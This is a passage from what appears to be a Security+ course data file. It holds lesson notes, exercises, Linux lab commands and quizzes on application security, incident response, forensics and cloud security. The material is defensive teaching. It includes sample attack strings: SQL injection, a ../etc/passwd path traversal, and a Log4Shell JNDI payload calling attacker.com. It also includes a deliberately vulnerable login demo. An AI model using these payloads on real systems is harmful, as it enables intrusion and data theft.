\` steals session cookies.\n\n**Prevention:** Output encoding (escape <, >, ", & in HTML output). Content Security Policy (CSP).\n\n---\n\n## Other Key Vulnerabilities\n\n**CSRF (Cross-Site Request Forgery):** Tricking a logged-in user's browser into making unintended requests. Prevention: CSRF tokens, SameSite cookies.\n\n**Directory traversal:** \`../../../etc/passwd\` — reading files outside web root. Prevention: validate and sanitise file paths.\n\n**Command injection:** User input executed as OS command. Prevention: avoid shell calls with user input, use parameterised APIs.\n\n**Buffer overflow:** Writing beyond allocated memory. Can overwrite return addresses for code execution. Prevention: safe functions, memory-safe languages, ASLR, DEP/NX.\n\n---\n\n## Secure Development\n\n**SDLC (Secure Development Lifecycle):** Build security in from the start:\n1. Requirements: define security requirements\n2. Design: threat modelling (STRIDE)\n3. Development: secure coding standards\n4. Testing: SAST, DAST, pen testing\n5. Deployment: hardened configuration\n6. Maintenance: patch management\n\n**SAST (Static Analysis):** Analyses source code without running it. Finds vulnerabilities before compilation.\n**DAST (Dynamic Analysis):** Tests running application. Simulates real attacks.\n**Fuzzing:** Send random/malformed input to find crashes and vulnerabilities.`, exercise: { title: "Application Security Vulnerability Analysis", instructions: "Identify the vulnerability type and mitigation for each scenario.", items: [ "A login form allows input: ' OR '1'='1'--. User logs in without a password. What vulnerability?", "A user posts a comment: . Next visitors' cookies are stolen. What vulnerability?", "A file download URL is: /download?file=../../etc/passwd. The server returns /etc/passwd. What vulnerability?", "A password reset feature sends a link that expires in 7 days and allows 100 guesses before lockout. What problem?", "An application uses log4j 2.14 and a user sends payload {jndi:ldap://attacker.com/exploit}. What vulnerability?", "An admin console is accessible at /admin with no additional authentication beyond being logged in as any user. What vulnerability?", "A bank website allows a user to be tricked into clicking a link that transfers money without their knowledge. What attack?", "What is threat modelling (STRIDE) and when in the SDLC should it be performed?" ], answer: `1. SQL Injection (SQLi). The input ' OR '1'='1'-- closes the string, adds an always-true condition (OR '1'='1'), and comments out the rest of the query. The database returns all users. Fix: parameterised queries/prepared statements — user input is never concatenated into SQL. 2. Stored XSS (Cross-Site Scripting). The malicious JavaScript is saved to the database. Every subsequent visitor loads the page, their browser executes the script, and their session cookie is sent to the attacker. Fix: HTML output encoding (escape <, >, ", & before rendering user input). 3. Path traversal / directory traversal. The ../ sequences navigate up the directory tree, escaping the web root. The server serves arbitrary files the web server has read access to. Fix: validate and sanitise file paths, use allow-lists of permitted files, run web server with minimal permissions. 4. Weak token design and insufficient rate limiting. 7-day expiry is too long. 100 guesses is far too many for a 6-digit token (1,000,000 combinations). Fix: short expiry (15-60 min), single use tokens, low attempt limit (3-5), and invalidate on use. 5. Log4Shell (CVE-2021-44228). JNDI injection vulnerability in Apache Log4j. When the logging library logs the payload, it performs an LDAP lookup to the attacker's server and downloads and executes Java code. Allowed full remote code execution on millions of systems. Fix: update Log4j to 2.17+. 6. Broken Access Control (OWASP A01). Admin functionality accessible to any authenticated user. The application fails to enforce authorisation for privileged operations. Fix: implement RBAC, verify authorisation server-side for every privileged operation, never rely on UI hiding alone. 7. CSRF (Cross-Site Request Forgery). The user's browser is authenticated to the bank. The malicious link triggers the browser to make an authenticated request (transfer funds) without the user's intent. Fix: CSRF tokens (unique per-session value embedded in forms, verified server-side), SameSite=Strict cookies. 8. STRIDE threat modelling: identifies threats in the design phase by categorising them as Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege. Should be done in the DESIGN phase (step 2 of SDLC) — before writing any code. Finding architectural security flaws after implementation is vastly more expensive to fix.` }, practical: { title: "Application Security Testing Lab", platform: "Linux terminal", steps: [ { instruction: "Demonstrate SQL injection vulnerability and fix", command: `python3 << 'EOF' import sqlite3 # Set up vulnerable database conn = sqlite3.connect(':memory:') conn.execute("CREATE TABLE users (username TEXT, password TEXT, role TEXT)") conn.execute("INSERT INTO users VALUES ('admin','secret123','admin')") conn.execute("INSERT INTO users VALUES ('alice','pass456','user')") print("=== VULNERABLE CODE (never do this) ===") def vulnerable_login(username, password): # DANGEROUS: concatenates user input directly query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'" print(f"Query: {query}") result = conn.execute(query).fetchall() return result # Normal login print("\nNormal login (admin/secret123):", vulnerable_login("admin", "secret123")) # SQL injection attack print("\nSQL Injection attack:") attack = vulnerable_login("' OR '1'='1'--", "anything") print(f"Got {len(attack)} users:", attack) print("\n=== SAFE CODE (parameterised query) ===") def safe_login(username, password): query = "SELECT * FROM users WHERE username=? AND password=?" print(f"Query: {query}") result = conn.execute(query, (username, password)).fetchall() return result print("\nSQL injection attempt on safe code:") safe_result = safe_login("' OR '1'='1'--", "anything") print(f"Got {len(safe_result)} users:", safe_result) print("Attack failed - parameterised query treated input as literal string") EOF`, explain: "Parameterised queries completely prevent SQL injection. User input is passed as a parameter — the database treats it as literal string data, never as SQL code. Even if user types ' OR '1'='1', the database looks for a user literally named \\' OR \\'1\\'=\\'1\\' — which doesn't exist." }, { instruction: "XSS output encoding demonstration", command: `python3 << 'EOF' import html # Simulate user input containing XSS payload user_comment = '' user_name = 'Hacker' print("=== VULNERABLE: raw user input in HTML ===") vulnerable_html = f"

Comment by {user_name}: {user_comment}

" print(f"HTML rendered: {vulnerable_html}") print("Browser would EXECUTE the script!") print("\n=== SAFE: HTML entity encoding ===") safe_name = html.escape(user_name) safe_comment = html.escape(user_comment) safe_html = f"

Comment by {safe_name}: {safe_comment}

" print(f"HTML rendered: {safe_html}") print("Browser would DISPLAY the text, not execute it") # Show what html.escape does print("\nEscape mapping:") for char, escaped in [('<','<'), ('>','>'), ('"','"'), ("'",'''), ('&','&')]: print(f" {char} → {escaped}") EOF`, explain: "HTML entity encoding converts < to <, > to >, etc. The browser displays these as text, not as HTML tags or JavaScript. This one transformation prevents XSS. Every character that has HTML meaning must be escaped before being rendered in a browser." } ] }, quiz: [ { q: "SQL injection is prevented by:", opts: ["A. Input length validation", "B. Parameterised queries / prepared statements — user input treated as data, never SQL code", "C. Using a Web Application Firewall only", "D. Storing SQL queries in config files"], answer: "B", explain: "Parameterised queries: user input passed as parameters, never concatenated into SQL. Database treats input as literal string data. Even ' OR '1'='1' becomes a search for a user literally named that. WAF is a good additional layer but not a substitute for fixing the code." }, { q: "Stored XSS vs Reflected XSS:", opts: ["A. Stored is less dangerous", "B. Stored XSS saves malicious script to the database affecting all visitors; Reflected requires victim to click a crafted URL", "C. They use different injection techniques", "D. Reflected XSS persists longer"], answer: "B", explain: "Stored (Persistent) XSS: script saved in DB, executes for every user viewing that content. Higher impact — worms can spread. Reflected XSS: script in URL parameter, only executes when victim clicks the crafted link. Both require HTML output encoding to prevent." }, { q: "CSRF attack works by:", opts: ["A. Stealing session cookies directly", "B. Tricking an authenticated user's browser into making unintended requests using their active session", "C. Injecting scripts into web pages", "D. Bypassing authentication entirely"], answer: "B", explain: "CSRF: victim is logged into bank.com. Attacker gets victim to visit evil.com which contains a hidden form that submits to bank.com/transfer. Browser automatically includes session cookie. Bank sees authenticated request. Prevention: CSRF tokens, SameSite cookies." }, { q: "Directory traversal attack uses:", opts: ["A. SQL injection in file paths", "B. ../ sequences to navigate outside the web root and access arbitrary files", "C. Symbolic links to sensitive files", "D. HTTP header manipulation"], answer: "B", explain: "Directory traversal: ?file=../../../../etc/passwd navigates up directory tree. If server doesn't sanitise the path, it serves files outside the intended web root. Prevention: validate file paths against allow-list, use realpath() to resolve path and verify it's within allowed directory." }, { q: "SAST (Static Application Security Testing) analyses:", opts: ["A. Running application traffic", "B. Source code without executing it — finds vulnerabilities before compilation", "C. Network traffic between application components", "D. Production system logs"], answer: "B", explain: "SAST = static analysis = source code analysis without running the code. Finds issues like hardcoded secrets, SQL injection patterns, buffer overflows in source. Integrated into IDE and CI/CD pipeline. DAST = dynamic analysis = tests running application, simulates real attacks." }, { q: "OWASP Broken Access Control examples include:", opts: ["A. Weak passwords", "B. Accessing another user's account, escalating to admin, accessing APIs without auth", "C. SQL injection", "D. Outdated libraries"], answer: "B", explain: "Broken Access Control (A01): users acting outside intended permissions. Examples: ?userId=123 → change to ?userId=456 to see another user's data (IDOR). Accessing /admin without admin role. Using API endpoints without authentication. The most common web vulnerability." }, { q: "The primary defence against XSS is:", opts: ["A. Blocking all JavaScript", "B. Output encoding — escaping HTML special characters before rendering user input", "C. Input length limits", "D. HTTPS enforcement"], answer: "B", explain: "Output encoding: convert < to <, > to >, etc. before placing user data in HTML. Browser displays characters as text, never executes them as HTML/JavaScript. Must be context-aware: different encoding for HTML, JavaScript, CSS, URL contexts." }, { q: "Threat modelling (STRIDE) should be performed:", opts: ["A. After deployment, during monitoring", "B. During the design phase — before writing code, when architectural changes are cheap", "C. Only after a security incident", "D. During penetration testing"], answer: "B", explain: "STRIDE threat modelling in design phase: identify threats before they're built in. Cost to fix a security flaw in design = minimal. In development = moderate. In production = extremely expensive. STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege." }, { q: "Log4Shell (CVE-2021-44228) demonstrates which vulnerability type?", opts: ["A. SQL injection in logging framework", "B. JNDI injection — log input triggers LDAP lookup and remote code execution", "C. Buffer overflow in Java", "D. XSS via log display"], answer: "B", explain: "Log4Shell: when Log4j logs a string containing {jndi:ldap://attacker.com/x}, it makes an LDAP request to the attacker's server and loads and executes the returned Java class. Pure remote code execution by sending a payload that gets logged. Affected millions of systems in 2021." }, { q: "Fuzzing is used to:", opts: ["A. Encrypt test data before transmission", "B. Send random/malformed input to find crashes, memory errors, and unexpected behaviour", "C. Generate fake user traffic for load testing", "D. Finds: crashes (buffer overflows), unhandled exceptions, input validation gaps, memory leaks. Tools: AFL, libFuzzer. Used to discover vulnerabilities before attackers do." } ] }, { id: "8-33", week: 8, day: 33, phase: "Security+", color: "#f472b6", title: "Security Operations — Incident Response & Forensics", objective: "Master the incident response lifecycle, understand digital forensics principles, know SIEM/SOAR concepts, and practice log analysis.", messer: "Professor Messer SY0-701 — 4.2 Incident Response", notes: `## Incident Response (IR) Lifecycle\n\nNIST SP 800-61 defines the IR lifecycle:\n\n**1. Preparation:**\n- IR policy, procedures, and playbooks\n- Incident response team (CSIRT)\n- Tools: SIEM, forensics workstation, write blockers\n- Communication plan\n\n**2. Detection and Analysis:**\n- Monitor for anomalies and indicators of compromise\n- Triage: determine scope and severity\n- Document everything from the start\n\n**3. Containment:**\n- Short-term: stop the bleeding (isolate affected systems)\n- Long-term: prevent re-infection\n- Preserve evidence for forensics\n\n**4. Eradication:**\n- Remove the threat: malware, backdoors, compromised accounts\n- Patch vulnerabilities exploited\n\n**5. Recovery:**\n- Restore systems to production\n- Verify no malware remains\n- Monitor closely for recurrence\n\n**6. Post-incident Activity (Lessons Learned):**\n- What happened? How was it detected? How did we respond?\n- What did we do well? What needs improvement?\n- Update playbooks and controls\n\n---\n\n## Digital Forensics Principles\n\n**Order of volatility:** Collect most volatile evidence first:\n1. CPU registers and cache\n2. RAM (running processes, network connections, encryption keys)\n3. Swap/pagefile\n4. Running processes\n5. Network connections\n6. Disk (hard drive image)\n7. Remote logging/monitoring data\n8. Physical configuration, network topology\n\n**Chain of custody:** Documentation tracking who handled evidence, when, and what was done. Without chain of custody, evidence may be inadmissible.\n\n**Write blocker:** Hardware device that prevents writing to a storage device during forensic imaging. Preserves original evidence.\n\n**Forensic image:** Bit-for-bit copy of storage media including deleted files, slack space, and unallocated space. Use dd or FTK Imager.\n\n**Legal hold:** Notification to preserve evidence relevant to litigation. Must not delete or alter anything under legal hold.\n\n---\n\n## SIEM (Security Information and Event Management)\n\nAggregates and correlates security events from across the organisation.\n\n**Functions:**\n- **Log aggregation:** Collect logs from all sources (firewalls, endpoints, servers, cloud)\n- **Normalisation:** Convert different log formats to a standard schema\n- **Correlation:** Match related events across different systems to detect attacks\n- **Alerting:** Generate alerts when rule conditions are met\n- **Dashboards:** Visualise security posture\n- **Retention:** Store logs for compliance (often 1-7 years)\n\n**Examples:** Splunk, Microsoft Sentinel, IBM QRadar, Elastic SIEM.\n\n---\n\n## SOAR (Security Orchestration, Automation and Response)\n\nAutomates repetitive IR tasks:\n- Automatically isolate a compromised endpoint when malware is detected\n- Enrich alerts with threat intelligence (VirusTotal lookup)\n- Create tickets in ServiceNow automatically\n- Block malicious IPs in firewall via API\n\nSIEM detects → SOAR responds.\n\n---\n\n## Threat Intelligence\n\n**IoC (Indicator of Compromise):** Evidence of a breach: malicious IP, domain, file hash, registry key.\n\n**TTPs (Tactics, Techniques, Procedures):** How attackers operate. MITRE ATT&CK framework catalogues known TTPs.\n\n**STIX/TAXII:** Standard formats for sharing threat intelligence between organisations.`, exercise: { title: "Incident Response and Forensics Scenarios", instructions: "Apply the correct IR or forensics procedure to each scenario.", items: [ "Ransomware is detected on a workstation. In what order should the IR team respond?", "A forensics investigator needs to image a hard drive from a compromised server. What tools/procedures are required?", "Why is RAM collected before disk during forensic investigation?", "An employee is suspected of exfiltrating data. What evidence type has the highest volatility?", "A SIEM generates 500 alerts per day but analysts review only 20. What concept addresses this?", "SOAR vs SIEM — what does SOAR add that SIEM alone does not provide?", "Chain of custody is violated during evidence collection. What is the legal consequence?", "During the 'lessons learned' phase, the team discovers the breach went undetected for 3 months. What should be improved?" ], answer: `1. Detection → Containment (isolate from network immediately to stop spread) → Evidence preservation (image memory and disk before remediation) → Eradication (remove malware, close access vectors) → Recovery (restore from clean backups, verify clean) → Lessons learned. Critical order: CONTAIN first, then investigate — not the reverse. 2. Use a write blocker (hardware device connected between drive and forensic workstation) to prevent any writes to the original drive. Create a forensic image using dd or FTK Imager — bit-for-bit copy including deleted files and unallocated space. Hash both original and image (SHA-256) and verify they match. Store original in tamper-evident packaging. Document every step for chain of custody. 3. RAM is the most volatile evidence — it's lost the moment the system is powered off (order of volatility: RAM comes before disk). RAM contains: running processes, network connections, decryption keys (including full-disk encryption keys in memory), temporary files, clipboard contents, and unencrypted versions of encrypted data. This evidence cannot be recovered from disk images. 4. RAM (running memory) has the highest volatility. It can contain the malware, communication channels, and any data the employee was actively working with. After RAM: network connections, running processes, then disk artifacts. Log files and email have lower volatility but are more persistent. 5. Alert fatigue / signal-to-noise ratio. Too many low-quality alerts means analysts stop paying attention. Solutions: tune SIEM correlation rules to reduce false positives, implement triage automation (SOAR), risk-score alerts, and use threat intelligence to prioritise relevant alerts. 6. SOAR adds automated response to SIEM detection. SIEM = detect and alert. SOAR = detect → automatically execute a playbook response (isolate endpoint, block IP in firewall, create ticket, notify team). SOAR reduces response time from minutes/hours to seconds and handles repetitive tasks at scale. 7. The evidence may be ruled inadmissible in court. Chain of custody documents that evidence was not tampered with. If continuity is broken (unknown handler, missing timestamps), defence attorneys argue the evidence was altered and it may be excluded. Without admissible evidence, criminal prosecution or civil litigation fails. 8. Detection capabilities and monitoring coverage were insufficient. Improvements: (1) Deploy more comprehensive logging and SIEM rules. (2) Implement a 24/7 SOC or MDR (Managed Detection and Response). (3) Conduct threat hunting to proactively search for hidden threats. (4) Deploy EDR (Endpoint Detection and Response) for behavioural detection. A 3-month dwell time indicates a monitoring gap.` }, practical: { title: "Log Analysis and Forensics Lab", platform: "Linux terminal", steps: [ { instruction: "Analyse system logs for security events", command: `echo "=== Authentication Events ===" # Last successful logins last | head -10 # Failed login attempts (brute force detection) sudo grep "Failed password\|authentication failure" \ /var/log/auth.log 2>/dev/null | tail -10 echo -e "\n=== System Events ===" # Recent sudo usage (privilege escalation) sudo grep "sudo" /var/log/auth.log 2>/dev/null | \ grep -v "pam_unix" | tail -10 # New user creation (persistence indicator) sudo grep "useradd\|groupadd" /var/log/auth.log 2>/dev/null | tail -5 echo -e "\n=== File System Changes ===" # Recently modified files in sensitive areas find /etc /bin /sbin -newer /etc/passwd \ -type f 2>/dev/null | head -10`, explain: "Security monitoring means watching these logs continuously. Failed password clustering from one IP = brute force. Successful login after many failures = breach. sudo usage by unusual accounts = privilege escalation. New accounts = persistence. Modified system binaries = rootkit." }, { instruction: "Create forensic hash and simulate evidence collection", command: `# Create a test 'evidence file' (simulating a suspicious file) echo "Evidence data" > /tmp/evidence_test.txt echo "Malware payload simulation" >> /tmp/evidence_test.txt echo "=== FORENSIC IMAGING PROCESS ===" # Step 1: Hash the original (document before touching) echo "Original file hash:" sha256sum /tmp/evidence_test.txt # Step 2: Create forensic copy (bit-for-bit with dd) dd if=/tmp/evidence_test.txt of=/tmp/evidence_copy.img bs=512 2>/dev/null echo "Forensic image created" # Step 3: Hash the image echo "Image hash:" sha256sum /tmp/evidence_copy.img # Step 4: Compare hashes (must match for valid forensic image) ORIG=$(sha256sum /tmp/evidence_test.txt | awk '{print $1}') COPY=$(sha256sum /tmp/evidence_copy.img | awk '{print $1}') [ "$ORIG" = "$COPY" ] && echo "HASHES MATCH - forensic image verified" || echo "HASH MISMATCH - image invalid" # Step 5: Log the chain of custody echo "Chain of custody entry: $(date) - Evidence imaged by $(whoami)"`, explain: "Forensic imaging: hash before touching, dd to create bit-for-bit copy, hash the copy, verify they match. This proves the copy is identical to the original and nothing was added or removed. Every step must be documented with timestamps and responsible person for chain of custody." } ] }, quiz: [ { q: "The correct order of volatility for forensic collection is:", opts: ["A. Disk → RAM → Network connections", "B. RAM → Swap → Running processes → Network connections → Disk", "C. Network → Disk → RAM", "D. All evidence has equal volatility"], answer: "B", explain: "Collect most volatile first: CPU registers/cache → RAM → swap/pagefile → running processes → network connections → disk. RAM is lost when system powers off. Disk persists. Always collect RAM before anything that might require a reboot." }, { q: "Chain of custody in digital forensics ensures:", opts: ["A. Evidence is encrypted", "B. Documented tracking of evidence handling — proves it was not tampered with for admissibility", "C. Evidence is backed up in multiple locations", "D. Only law enforcement can access evidence"], answer: "B", explain: "Chain of custody: continuous documentation of who collected evidence, when, what was done, who it was transferred to, and under what conditions. Breaks in the chain allow defence to argue tampering — evidence may be inadmissible." }, { q: "A write blocker is used during forensics to:", opts: ["A. Block write access to the investigator's notes", "B. Prevent any writes to the original evidence drive during imaging — preserves original evidence", "C. Block network access during investigation", "D. Prevent the suspect from accessing their system"], answer: "B", explain: "Write blocker: hardware device between evidence drive and forensic workstation. Allows reading only — any write commands are blocked. Without it, mounting a drive in an OS can modify metadata (access timestamps), potentially corrupting evidence and violating chain of custody." }, { q: "SIEM primary function:", opts: ["A. Automatically respond to and remediate security incidents", "B. Aggregate and correlate security events from multiple sources to detect threats", "C. Replace all other security tools", "D. Encrypt security logs for compliance"], answer: "B", explain: "SIEM: collects logs from firewalls, endpoints, servers, cloud, etc. Normalises to standard format. Applies correlation rules (3 failed logins + 1 success from same IP = potential breach). Generates alerts. Provides investigation and compliance reporting." }, { q: "SOAR adds what capability that SIEM lacks?", opts: ["A. Better log aggregation", "B. Automated response execution — triggering playbooks to contain threats without human intervention", "C. Real-time threat intelligence", "D. Compliance reporting"], answer: "B", explain: "SIEM = detect and alert. SOAR = detect + automatically execute response. SOAR integrates with firewalls, EDR, ticketing systems via API. When alert fires, SOAR runs playbook: isolate endpoint + block IP + create ticket + notify team — in seconds." }, { q: "First step in responding to ransomware discovery:", opts: ["A. Immediately restore from backup", "B. Notify management and legal team", "C. Contain — isolate the affected system from the network immediately", "D. Collect forensic evidence before touching anything"], answer: "C", explain: "Contain first. Ransomware spreads rapidly across network shares. Disconnect the infected system IMMEDIATELY to stop spread. Then: preserve evidence, eradicate, recover. Yes, forensics matters — but letting ransomware spread to 1,000 more machines while you collect evidence is catastrophic." }, { q: "The 'lessons learned' phase of IR:", opts: ["A. Is optional for minor incidents", "B. Reviews what happened, what was done well, what needs improvement — updates playbooks and controls", "C. Only involves the CISO and legal team", "D. Must be completed within 24 hours"], answer: "B", explain: "Lessons learned (post-incident activity): structured review after the incident is resolved. What worked? What didn't? How was detection time? What gaps need addressing? Update playbooks, implement new controls, train staff. This phase prevents repeat incidents." }, { q: "The MITRE ATT&CK framework categorises:", opts: ["A. Software vulnerabilities", "B. Known adversary TTPs (Tactics, Techniques, Procedures) used in real attacks", "C. Compliance requirements", "D. Network protocol vulnerabilities"], answer: "B", explain: "MITRE ATT&CK: knowledge base of real-world adversary behaviours organised by tactic (what they want to achieve) and technique (how they do it). Used for: threat hunting, detection engineering, red team planning, incident investigation, security gap analysis." }, { q: "Legal hold means:", opts: ["A. Pausing all security investigations", "B. Preserving all potentially relevant evidence — must not delete, modify, or destroy anything covered", "C. Holding suspects in custody", "D. Temporarily suspending user accounts"], answer: "B", explain: "Legal hold: formal notice to preserve all relevant data for litigation or investigation. Applies to emails, files, logs, databases. Violating a legal hold (deleting covered evidence) can result in sanctions, adverse inference instructions, or criminal obstruction charges." }, { q: "A forensic image differs from a regular backup because:", opts: ["A. Forensic images are compressed", "B. Forensic images are bit-for-bit copies including deleted files, slack space, and unallocated space", "C. Regular backups are more reliable", "D. Forensic images exclude system files"], answer: "B", explain: "Forensic image = exact bit-for-bit copy of the entire storage media. Includes: active files, deleted files (before overwriting), file slack space, unallocated space, partition table, boot sector. Regular backups copy only active files. Forensics requires everything — deleted files often contain key evidence." } ] }, { id: "9-34", week: 9, day: 34, phase: "Security+", color: "#f472b6", title: "Cloud Security & Virtualisation", objective: "Understand cloud service models, deployment types, shared responsibility, cloud security controls, and virtualisation security.", messer: "Professor Messer SY0-701 — 3.6 Cloud Infrastructure", notes: `## Cloud Service Models\n\n**IaaS (Infrastructure as a Service):** Provider gives: VMs, storage, networking. Customer manages: OS, applications, security config. Example: AWS EC2, Azure VMs, GCP Compute Engine.\n\n**PaaS (Platform as a Service):** Provider gives: runtime, middleware, database. Customer manages: applications and data only. Example: AWS Elastic Beanstalk, Google App Engine, Heroku.\n\n**SaaS (Software as a Service):** Provider gives: full application. Customer manages: data and user configuration only. Example: Office 365, Salesforce, Gmail.\n\nMemory aid: IaaS = Infrastructure, PaaS = Platform, SaaS = Software.\n\n---\n\n## Cloud Deployment Models\n\n**Public cloud:** Shared infrastructure owned by provider. Most cost-effective. Highest shared risk.\n\n**Private cloud:** Dedicated infrastructure for one organisation. On-premises or hosted. Most control.\n\n**Hybrid cloud:** Mix of public and private. Critical workloads on private, burst to public.\n\n**Community cloud:** Shared by organisations with common goals (government agencies, healthcare). Shared compliance posture.\n\n---\n\n## Shared Responsibility Model\n\nSecurity responsibilities are SPLIT between provider and customer.\n\n| Responsibility | IaaS | PaaS | SaaS |\n|---------------|------|------|------|\n| Physical security | Provider | Provider | Provider |\n| Network infrastructure | Provider | Provider | Provider |\n| Hypervisor | Provider | Provider | Provider |\n| OS patching | **Customer** | Provider | Provider |\n| Application security | **Customer** | **Customer** | Provider |\n| Data classification | **Customer** | **Customer** | **Customer** |\n| Identity/access | **Customer** | **Customer** | **Customer** |\n\nThe customer ALWAYS owns: data, identity, and access management.\n\n---\n\n## Cloud Security Controls\n\n**CASB (Cloud Access Security Broker):** Sits between users and cloud services. Enforces DLP, visibility, access control, threat protection for SaaS.\n\n**CSPM (Cloud Security Posture Management):** Continuously checks cloud configuration for misconfigurations. "Is this S3 bucket public? Is MFA enabled? Are security groups too permissive?"\n\n**CWPP (Cloud Workload Protection Platform):** Protects workloads (VMs, containers, serverless) across cloud environments.\n\n**IAM in cloud:** Role-based access for cloud resources. Principle: grant least privilege via IAM roles/policies.\n\n**VPC (Virtual Private Cloud):** Logically isolated network within cloud. Security groups = stateful firewall per instance. NACLs = stateless firewall per subnet.\n\n---\n\n## Virtualisation Security\n\n**Hypervisor types:**\n- **Type 1 (bare metal):** Runs directly on hardware. VMware ESXi, Microsoft Hyper-V. More secure, better performance.\n- **Type 2 (hosted):** Runs on top of OS. VMware Workstation, VirtualBox. Easier but adds OS attack surface.\n\n**VM escape:** Vulnerability allowing attacker to break out of VM and access hypervisor or other VMs. Most severe virtualisation vulnerability. Mitigation: keep hypervisor patched.\n\n**VM sprawl:** Uncontrolled proliferation of VMs — forgotten, unpatched, and potentially vulnerable. Governance required.\n\n**Snapshot security:** VM snapshots include entire memory state. If a snapshot is leaked, an attacker may recover passwords and keys from memory.\n\n---\n\n## Container Security\n\n**Docker/Kubernetes:** Containers share the host OS kernel — less isolation than VMs.\n\n**Container threats:**\n- Image vulnerabilities (running old images with CVEs)\n- Privileged containers (can modify host)\n- Secrets in image layers\n- Container escape\n\n**Mitigations:**\n- Scan images for CVEs before deployment\n- Never run containers as root\n- Use read-only filesystems where possible\n- Store secrets in Vault, not in image`, exercise: { title: "Cloud Security Scenarios", instructions: "Identify the correct cloud security model, control, or responsibility.", items: [ "A company uses AWS EC2 to run its web application. The EC2 instance OS hasn't been patched in 6 months. Who is responsible?", "Sensitive customer records are stored in an S3 bucket that is publicly accessible. What tool would detect this misconfiguration?", "Employees are using personal Dropbox to share company files, bypassing corporate DLP policies. What security control addresses this?", "A company needs maximum control over their cloud environment but wants cloud economics. What deployment model?", "VM escape — what is it and why is it the most critical virtualisation vulnerability?", "In SaaS model, the customer is responsible for what security aspects?", "What is the difference between an AWS Security Group and a NACL?", "A Docker container is running as root with --privileged flag. What is the risk?" ], answer: `1. The CUSTOMER (the company) is responsible. In IaaS, the cloud provider manages physical security, network infrastructure, and hypervisor. The customer owns: OS patching, application security, data, and identity. Unpatched OS on an EC2 instance = customer's responsibility and vulnerability. 2. CSPM (Cloud Security Posture Management). CSPM continuously monitors cloud resources for misconfigurations: public S3 buckets, overly permissive IAM policies, missing encryption, disabled MFA. AWS Config, Azure Security Center, and Prisma Cloud are examples. 3. CASB (Cloud Access Security Broker). CASB provides visibility and control over SaaS usage including Shadow IT (unauthorised cloud services). It can detect Dropbox usage, block it, or apply DLP policies to data shared through it. Can be deployed as proxy, API-based, or agent. 4. Private cloud. Dedicated infrastructure for the organisation, deployed in their own data centre or a hosted facility. Maximum control and customisation. Higher cost than public cloud but allows compliance with regulations that prohibit shared infrastructure. 5. VM escape: vulnerability allowing attacker to break out of the guest VM boundary and access the hypervisor, host OS, or other VMs on the same physical host. Most critical because a single exploited VM can compromise ALL other VMs on the same host. Mitigation: aggressive hypervisor patching, don't run untrusted workloads on same hypervisor as critical workloads. 6. SaaS customer responsibilities: (1) Data classification and protection. (2) Identity and access management (who has access, MFA). (3) Client endpoint security. The provider manages everything else: physical, network, OS, patches, and application code. Key: you always own your data. 7. Security Group: stateful firewall applied at the EC2 instance level. Return traffic auto-allowed. NACL: stateless ACL applied at the subnet level. Must explicitly allow inbound AND outbound. Security Groups are easier to manage (stateful). NACLs add subnet-level defence in depth. 8. Privileged container running as root: near-total access to the host system. Can mount the host filesystem, modify host kernel parameters, escape the container namespace, access other containers' data, and compromise the entire host. Never run containers as root or with --privileged unless absolutely necessary and well understood.` }, practical: { title: "Cloud and Container Security Lab", platform: "Linux terminal", steps: [ { instruction: "Audit Docker containers for security issues", command: `# Check if Docker is available docker version 2>/dev/null | head -3 || echo "Docker not installed - showing concepts" # If Docker available, audit containers: echo "=== Container Security Audit ===" # Check for containers running as root (security risk) docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}" 2>/dev/null || \ echo "No running containers" # Check image vulnerability scanning concept echo -e "\n=== Security Checks (educational) ===" echo "1. Never run containers as root:" echo " Risky: docker run ubuntu bash (runs as root)" echo " Safe: docker run --user 1000:1000 ubuntu bash" echo "" echo "2. Never use --privileged flag in production" echo " Risky: docker run --privileged ubuntu" echo "" echo "3. Read-only filesystem where possible:" echo " Safe: docker run --read-only ubuntu" echo "" echo "4. Scan images for CVEs before deployment:" echo " Command: docker scout cves ubuntu:latest (Docker Scout)" echo " Command: trivy image ubuntu:latest (Trivy)"`, explain: "Container security principle: least privilege. Containers should run as non-root users, without privileged mode, with minimal capabilities. Scan images for CVEs before deployment — an image with a critical unpatched CVE is as dangerous as an unpatched physical server." }, { instruction: "Simulate cloud IAM least privilege", command: `python3 << 'EOF' # Simulate AWS IAM policy evaluation (concept demo) # Overly permissive policy (BAD) admin_policy = { "Effect": "Allow", "Action": "*", "Resource": "*" } # Least privilege policy for a read-only S3 user (GOOD) s3_readonly_policy = { "Effect": "Allow", "Action": ["s3:GetObject", "s3:ListBucket"], "Resource": ["arn:aws:s3:::my-bucket", "arn:aws:s3:::my-bucket/*"], "Condition": { "StringEquals": { "s3:prefix": ["reports/"] } } } print("=== IAM Policy Comparison ===\n") print("OVERLY PERMISSIVE (never use Action=*, Resource=*):") print(f" Action: {admin_policy['Action']}") print(f" Resource: {admin_policy['Resource']}") print(f" Risk: Allows ANYTHING on ANY resource\n") print("LEAST PRIVILEGE (correct approach):") print(f" Action: {s3_readonly_policy['Action']}") print(f" Resource: {s3_readonly_policy['Resource']}") print(f" Condition: {s3_readonly_policy['Condition']}") print(f" Risk: Can ONLY read objects in reports/ prefix of my-bucket\n") # Show blast radius difference print("Blast radius if this credential is compromised:") print(" Admin policy: Attacker controls ENTIRE AWS account") print(" Least privilege: Attacker can only read reports/ in one bucket") EOF`, explain: "IAM least privilege is the single most impactful cloud security control. An attacker who compromises a 'Admin' credential owns your entire cloud account. A compromised least-privilege credential can do only the minimum. This principle applies equally to AWS IAM, Azure RBAC, and GCP IAM." } ] }, quiz: [ { q: "In IaaS, OS patching is the responsibility of:", opts: ["A. The cloud provider", "B. The customer", "C. Shared equally", "D. A third-party vendor"], answer: "B", explain: "IaaS shared responsibility: provider manages physical, network, and hypervisor. Customer manages: OS (including patches), application, data, and identity. An unpatched OS on an IaaS VM is the customer's security failure." }, { q: "CSPM (Cloud Security Posture Management) primarily addresses:", opts: ["A. DDoS attacks against cloud infrastructure", "B. Cloud misconfigurations — public buckets, overly permissive IAM, missing encryption", "C. Container vulnerability scanning", "D. Cloud network performance"], answer: "B", explain: "CSPM: continuously monitors cloud configuration against best practices and compliance frameworks. Detects: public S3 buckets, overly permissive security groups, IAM policies violating least privilege, encryption disabled, MFA not required. Major breaches (Capital One) were due to misconfigurations detected by CSPM-like tools." }, { q: "A CASB provides:", opts: ["A. Physical security for cloud data centres", "B. Visibility and control over SaaS 